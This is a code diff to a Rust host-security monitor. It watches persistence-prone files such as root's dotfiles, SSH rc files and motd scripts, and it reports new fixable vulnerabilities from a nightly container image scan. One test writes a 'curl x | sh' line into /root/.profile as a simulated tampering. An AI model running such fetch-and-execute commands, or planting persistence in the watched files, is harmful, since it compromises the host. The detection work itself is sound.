@@ -2,7 +2,8 @@
 //!
 //! Everything is read through read-only mounts (deploy/docker-compose.yml): the host's auth.log, NPM's
 //! access logs, a fixed list of files an intruder would change, the host's listening sockets, Docker's
-//! container configs and update-notifier's summary. State lives in DATA_DIR/security.json: log offsets,
+//! container configs, update-notifier's summary and the nightly image scan (deploy/hardening/
+//! dock-image-scan.py). State lives in DATA_DIR/security.json: log offsets,
 //! the networks and SSH keys seen before, file hashes and recent events. Nothing here talks to the
 //! outside: apps-chat polls `/security/outbox` for new alert events and posts them.
 //!
@@ -31,11 +32,15 @@ const MAX_LOGINS: usize = 60;
 const SLOW_EVERY: f64 = 60.;
 const UPDATES_EVERY: f64 = 600.;
 const MAX_FILE_BYTES: u64 = 1024 * 1024;
+const MAX_SCAN_BYTES: u64 = 4 * 1024 * 1024;
+/** an image scan older than this colours the category: the nightly timer has missed a night */
+const SCAN_STALE: f64 = 2. * 86_400.;
 
 #[derive(Clone)]
 pub struct Roots {
-    /// host views: log/ (/var/log), etc/ (/etc), ssh/ (/root/.ssh), cron/ (/var/spool/cron),
-    /// boot/ (/boot), apt/ (/var/lib/update-notifier), containers/ (/var/lib/docker/containers)
+    /// host views: log/ (/var/log), etc/ (/etc), root/ (/root), cron/ (/var/spool/cron),
+    /// boot/ (/boot), apt/ (/var/lib/update-notifier), containers/ (/var/lib/docker/containers),
+    /// scan/ (/var/lib/dock-scan)
     pub host: PathBuf,
     pub proc: PathBuf,
     pub npm: PathBuf,
@@ -151,6 +156,15 @@ struct State {
     containers: BTreeMap<String, Seen>,
     #[serde(default)]
     events: VecDeque<Event>,
+    /// WATCH entries already learned: one added in a later version is learned silently, like a first run
+    #[serde(default)]
+    watched: BTreeSet<String>,
+    /// "image|SEVERITY|id|package" of every fixable CRITICAL/HIGH finding in the last image scan
+    #[serde(default)]
+    image_vulns: BTreeSet<String>,
+    /// `scanned` of the last image scan turned into events
+    #[serde(default)]
+    scan_seen: f64,
 }
 
 #[derive(Default, Clone, Serialize)]
@@ -178,6 +192,9 @@ struct Live {
     containers: Vec<Ctr>,
     updates: Updates,
     checked: f64,
+    /// the scanner's images.json, and the (size, mtime) it was read at
+    scan: Value,
+    scan_stamp: Option<(u64, i64, i64)>,
 }
 
 pub struct Security {
@@ -699,14 +716,26 @@ const WATCH: &[Watch] = &[
         dir: true,
     },
     Watch {
-        at: "ssh/authorized_keys",
+        at: "root/.ssh/authorized_keys",
         shown: "/root/.ssh/authorized_keys",
         level: Level::Bad,
         dir: false,
     },
     Watch {
-        at: "ssh/authorized_keys2",
+        at: "root/.ssh/authorized_keys2",
         shown: "/root/.ssh/authorized_keys2",
+        level: Level::Bad,
+        dir: false,
+    },
+    Watch {
+        at: "root/.ssh/rc",
+        shown: "/root/.ssh/rc",
+        level: Level::Bad,
+        dir: false,
+    },
+    Watch {
+        at: "etc/ssh/sshrc",
+        shown: "/etc/ssh/sshrc",
         level: Level::Bad,
         dir: false,
     },
@@ -783,6 +812,42 @@ const WATCH: &[Watch] = &[
         dir: false,
     },
     Watch {
+        at: "root/.bashrc",
+        shown: "/root/.bashrc",
+        level: Level::Warn,
+        dir: false,
+    },
+    Watch {
+        at: "root/.profile",
+        shown: "/root/.profile",
+        level: Level::Warn,
+        dir: false,
+    },
+    Watch {
+        at: "root/.bash_profile",
+        shown: "/root/.bash_profile",
+        level: Level::Warn,
+        dir: false,
+    },
+    Watch {
+        at: "root/.bash_login",
+        shown: "/root/.bash_login",
+        level: Level::Warn,
+        dir: false,
+    },
+    Watch {
+        at: "root/.bash_aliases",
+        shown: "/root/.bash_aliases",
+        level: Level::Warn,
+        dir: false,
+    },
+    Watch {
+        at: "etc/update-motd.d",
+        shown: "/etc/update-motd.d",
+        level: Level::Warn,
+        dir: true,
+    },
+    Watch {
         at: "etc/environment",
         shown: "/etc/environment",
         level: Level::Warn,
@@ -819,13 +884,20 @@ const WATCH: &[Watch] = &[
         dir: true,
     },
 ];
+fn covers(w: &Watch, shown: &str) -> bool {
+    shown == w.shown || (w.dir && shown.starts_with(&format!("{}/", w.shown)))
+}
 fn level_of(shown: &str) -> Level {
     WATCH
         .iter()
-        .filter(|w| shown == w.shown || (w.dir && shown.starts_with(&format!("{}/", w.shown))))
+        .filter(|w| covers(w, shown))
         .map(|w| w.level)
         .max()
         .unwrap_or(Level::Warn)
+}
+/// the WATCH entry a watched path belongs to
+fn watch_of(shown: &str) -> Option<&'static str> {
+    WATCH.iter().find(|w| covers(w, shown)).map(|w| w.shown)
 }
 fn sign(path: &Path, shown: &str) -> Option<FileSig> {
     let meta = fs::symlink_metadata(path).ok()?;
@@ -1435,6 +1507,12 @@ impl Security {
     fn check_files(&mut self, now: f64) {
         let current = scan_files(&self.roots.host);
         let old = std::mem::take(&mut self.st.files);
+        // entries watched before (state from older versions has no `watched` yet: any file of theirs counts)
+        let learned: BTreeSet<&str> = WATCH
+            .iter()
+            .map(|w| w.shown)
+            .filter(|r| self.st.watched.contains(*r) || old.keys().any(|p| watch_of(p) == Some(*r)))
+            .collect();
         let mut next = BTreeMap::new();
         let mut events = Vec::new();
         for (path, mut sig) in current {
@@ -1470,7 +1548,7 @@ impl Security {
                         detail.join(" · "),
                     ));
                 }
-                None if !self.seeding && !old.is_empty() => {
+                None if !self.seeding && watch_of(&path).is_some_and(|r| learned.contains(r)) => {
                     sig.changed = now;
                     events.push((
                         level_of(&path),
@@ -1487,9 +1565,11 @@ impl Security {
                 events.push((level_of(path), format!("ไฟล์ถูกลบ: {path}"), String::new()));
             }
         }
-        if next != old {
+        let watched: BTreeSet<String> = WATCH.iter().map(|w| w.shown.to_string()).collect();
+        if next != old || watched != self.st.watched {
             self.dirty = true;
         }
+        self.st.watched = watched;
         self.st.files = next;
         self.st.files_checked = now;
         for (level, title, detail) in events {
@@ -1616,6 +1696,129 @@ impl Security {
         self.live.containers = list;
         self.live.checked = now;
     }
+    /// The nightly scanner's summary: re-read when it changes; a new scan raises one event for new
+    /// fixable CRITICAL/HIGH findings (keyed by image name, so rebuilding an image does not repeat them).
+    fn check_scan(&mut self, now: f64) {
+        let path = self.roots.host.join("scan/images.json");
+        let Ok(meta) = fs::metadata(&path) else {
+            self.live.scan = Value::Null;
+            self.live.scan_stamp = None;
+            return;
+        };
+        let stamp = (meta.len(), meta.mtime(), meta.mtime_nsec());
+        if self.live.scan_stamp == Some(stamp) {
+            return;
+        }
+        if meta.len() > MAX_SCAN_BYTES {
+            eprintln!("security: images.json is {} bytes, ignored", meta.len());
+            return;
+        }
+        let Some(doc) = fs::read(&path)
+            .ok()
+            .and_then(|b| serde_json::from_slice::<Value>(&b).ok())
+            .filter(|d| d["images"].is_array())
+        else {
+            return;
+        };
+        self.live.scan_stamp = Some(stamp);
+        let scanned = doc["scanned"].as_f64().unwrap_or(0.);
+        if scanned > self.st.scan_seen {
+            self.on_scan(&doc, now);
+            self.st.scan_seen = scanned;
+            self.dirty = true;
+        }
+        self.live.scan = doc;
+    }
+    fn on_scan(&mut self, doc: &Value, now: f64) {
+        let mut keys = BTreeSet::new();
+        for i in doc["images"].as_array().into_iter().flatten() {
+            let name = i["image"].as_str().unwrap_or("");
+            if i["error"].is_string() {
+                // a failed scan keeps what was known, so the next good one does not report it again
+                let prefix = format!("{name}|");
+                keys.extend(
+                    self.st
+                        .image_vulns
+                        .iter()
+                        .filter(|k| k.starts_with(&prefix))
+                        .cloned(),
+                );
+                continue;
+            }
+            for k in i["fixableKeys"]
+                .as_array()
+                .into_iter()
+                .flatten()
+                .filter_map(Value::as_str)
+            {
+                keys.insert(format!("{name}|{k}"));
+            }
+        }
+        let first = self.st.scan_seen == 0.;
+        let new: Vec<_> = keys
+            .iter()
+            .filter(|k| !self.st.image_vulns.contains(*k))
+            .filter_map(|k| {
+                let mut f = k.splitn(4, '|');
+                Some((f.next()?, f.next()?, f.next()?, f.next()?))
+            })
+            .collect();
+        let critical = new.iter().filter(|v| v.1 == "CRITICAL").count();
+        let level = if critical > 0 {
+            Level::Bad
+        } else if new.is_empty() {
+            Level::Info
+        } else {
+            Level::Warn
+        };
+        let mut by_image: BTreeMap<&str, Vec<String>> = BTreeMap::new();
+        for (image, _, id, pkg) in &new {
+            by_image
+                .entry(image)
+                .or_default()
+                .push(format!("{id} ({pkg})"));
+        }
+        let detail = by_image
+            .iter()
+            .map(|(image, v)| {
+                let more = if v.len() > 3 {
+                    format!(" และอีก {}", v.len() - 3)
+                } else {
+                    String::new()
+                };
+                format!("{image}: {}{more}", v[..v.len().min(3)].join(", "))
+            })
+            .collect::<Vec<_>>()
+            .join(" · ");
+        if self.seeding {
+            // a re-learn: the current findings are the baseline
+        } else if first {
+            let title = if new.is_empty() {
+                "สแกนช่องโหว่ใน image ครั้งแรก: ไม่พบรายการที่แก้ได้".to_string()
+            } else {
+                format!(
+                    "สแกนช่องโหว่ใน image ครั้งแรก: แก้ได้ {} รายการ (วิกฤต {critical}) ใน {} image",
+                    new.len(),
+                    by_image.len()
+                )
+            };
+            self.event(now, "images", level, title, detail, true);
+        } else if !new.is_empty() {
+            self.event(
+                now,
+                "images",
+                level,
+                format!(
+                    "ช่องโหว่ใหม่ที่มีแพตช์: {} รายการ (วิกฤต {critical}) ใน {} image",
+                    new.len(),
+                    by_image.len()
+                ),
+                detail,
+                true,
+            );
+        }
+        self.st.image_vulns = keys;
+    }
     fn prune(&mut self, now: f64) {
         let keep = (now as i64) - KEEP_DAYS * DAY;
         self.st.failed.retain(|h, _| *h >= keep);
@@ -1636,6 +1839,7 @@ impl Security {
         if self.seeding || now - self.last_slow >= SLOW_EVERY {
             self.check_files(now);
             self.check_host(now);
+            self.check_scan(now);
             if self.seeding || now - self.live.updates.checked >= UPDATES_EVERY {
                 self.live.updates = updates(&self.roots.host, &self.roots.proc, now);
             }
@@ -1700,12 +1904,19 @@ impl Security {
             "host" if self.live.updates.reboot || self.live.updates.security.unwrap_or(0) > 0 => {
                 Level::Warn
             }
+            "images"
+                if self.live.scan["scanned"]
+                    .as_f64()
+                    .is_some_and(|t| now - t > SCAN_STALE) =>
+            {
+                Level::Warn
+            }
             _ => Level::Info,
         };
         from_events.max(live)
     }
     pub fn payload(&self, now: f64) -> Value {
-        let cats = ["ssh", "panel", "files", "web", "host"];
+        let cats = ["ssh", "panel", "files", "web", "host", "images"];
         let status: BTreeMap<_, _> = cats.iter().map(|c| (*c, self.status(c, now))).collect();
         let overall = status.values().max().copied().unwrap_or(Level::Info);
         let day_ago = now - DAY as f64;
@@ -1833,6 +2044,19 @@ impl Security {
                     "updates": self.live.updates,
                     "checked": self.live.checked,
                 },
+                "images": {
+                    "status": status["images"],
+                    "scanned": self.live.scan["scanned"],
+                    "trivy": self.live.scan["trivy"],
+                    "dbError": self.live.scan["dbError"],
+                    "images": self.live.scan["images"].as_array().map(|a| a.iter().map(|i| {
+                        let mut i = i.clone();
+                        if let Some(o) = i.as_object_mut() {
+                            o.remove("fixableKeys");
+                        }
+                        i
+                    }).collect::<Vec<_>>()).unwrap_or_default(),
+                },
             },
             "events": self.st.events.iter().rev().take(60).collect::<Vec<_>>(),
         })
@@ -1861,7 +2085,8 @@ mod tests {
         for d in [
             "host/log",
             "host/etc/ssh",
-            "host/ssh",
+            "host/root/.ssh",
+            "host/scan",
             "host/containers",
             "host/apt",
             "host/boot",
@@ -2031,13 +2256,105 @@ mod tests {
     }
 
     #[test]
+    fn a_watch_entry_added_later_is_learned_silently() {
+        let t = Temp::new("added");
+        let r = roots(&t);
+        let now = 1_000_000.;
+        fs::write(r.host.join("etc/passwd"), "root:x:0:0::/root:/bin/bash\n").unwrap();
+        fs::write(r.host.join("root/.bashrc"), "# ~/.bashrc\n").unwrap();
+        let mut s = Security::load(r.clone(), now);
+        s.tick(now);
+        // as saved by a version that did not watch root's dotfiles yet
+        s.st.watched.clear();
+        s.st.files.retain(|p, _| p == "/etc/passwd");
+        s.check_files(now + 60.);
+        assert!(s.outbox(0)["events"].as_array().unwrap().is_empty());
+        assert!(s.st.files.contains_key("/root/.bashrc"));
+        assert!(s.st.watched.contains("/root/.profile"));
+        // from now on these entries are watched like the rest
+        fs::write(r.host.join("root/.profile"), "curl x | sh\n").unwrap();
+        fs::write(r.host.join("root/.bashrc"), "# ~/.bashrc\nalias ls=x\n").unwrap();
+        s.check_files(now + 120.);
+        let titles: Vec<_> = s.st.events.iter().map(|e| e.title.as_str()).collect();
+        assert!(titles.contains(&"มีไฟล์ใหม่: /root/.profile"), "{titles:?}");
+        assert!(titles.contains(&"ไฟล์สำคัญถูกแก้: /root/.bashrc"), "{titles:?}");
+    }
+
+    #[test]
+    fn image_scans_alert_on_new_fixable_findings_only() {
+        let t = Temp::new("scan");
+        let r = roots(&t);
+        let now = 1_000_000.;
+        let write = |scanned: f64, images: Value| {
+            let doc =
+                json!({ "scanned": scanned, "trivy": "0.75.0", "dbError": null, "images": images });
+            fs::write(r.host.join("scan/images.json"), doc.to_string()).unwrap();
+        };
+        let img = |name: &str, keys: &[&str]| json!({ "image": name, "counts": {}, "vulns": [], "fixableKeys": keys });
+        let mut s = Security::load(r.clone(), now);
+        s.tick(now);
+        // the first scan after the watch exists is reported once, as a summary
+        write(
+            now + 10.,
+            json!([
+                img("nginx:1", &["HIGH|CVE-1|openssl"]),
+                img("web:local", &[])
+            ]),
+        );
+        s.check_scan(now + 60.);
+        let e = s.st.events.back().unwrap();
+        assert!(
+            e.title
+                .starts_with("สแกนช่องโหว่ใน image ครั้งแรก: แก้ได้ 1 รายการ"),
+            "{}",
+            e.title
+        );
+        assert_eq!(
+            (e.level, e.alert, e.cat.as_str()),
+            (Level::Warn, true, "images")
+        );
+        assert!(
+            s.payload(now + 60.)["cats"]["images"]["images"][0]
+                .get("fixableKeys")
+                .is_none()
+        );
+        let n = s.st.events.len();
+        // the same file again, and a rebuild with the same findings: nothing new
+        s.check_scan(now + 120.);
+        write(
+            now + 86_400.,
+            json!([
+                img("nginx:1", &["HIGH|CVE-1|openssl"]),
+                img("web:local", &[])
+            ]),
+        );
+        s.check_scan(now + 86_460.);
+        assert_eq!(s.st.events.len(), n);
+        // a new critical finding is Bad; a failed scan of another image keeps what it had
+        write(
+            now + 2. * 86_400.,
+            json!([
+                img("nginx:1", &["HIGH|CVE-1|openssl", "CRITICAL|CVE-2|zlib"]),
+                { "image": "web:local", "error": "trivy: boom" },
+            ]),
+        );
+        s.check_scan(now + 2. * 86_400. + 60.);
+        let e = s.st.events.back().unwrap();
+        assert_eq!(e.level, Level::Bad);
+        assert!(e.detail.contains("nginx:1: CVE-2 (zlib)"), "{}", e.detail);
+        // once the events have aged out, a scan that stopped running still colours the category
+        assert_eq!(s.status("images", now + 6. * 86_400.), Level::Warn);
+        assert_eq!(s.status("images", now + 2. * 86_400. + 120.), Level::Bad);
+    }
+
+    #[test]
     fn first_run_learns_silently_then_changes_alert() {
         let t = Temp::new("watch");
         let r = roots(&t);
         let now = iso_time("2026-10-24T12:00:00+07:00").unwrap();
         fs::write(r.host.join("log/auth.log"), ssh("2026-10-24T09:00:00+07:00", "58.8.180.204", "SHA256:known") + "2026-10-24T09:01:00+07:00 ubuntu sshd[2]: Invalid user admin from 192.0.2.9 port 1\n").unwrap();
         fs::write(r.host.join("etc/passwd"), "root:x:0:0::/root:/bin/bash\n").unwrap();
-        fs::write(r.host.join("ssh/authorized_keys"), format!("{KEY}\n")).unwrap();
+        fs::write(r.host.join("root/.ssh/authorized_keys"), format!("{KEY}\n")).unwrap();
         fs::write(
             r.proc.join("1/net/tcp"),
             "h\n   0: 00000000:0016 00000000:0000 0A\n",
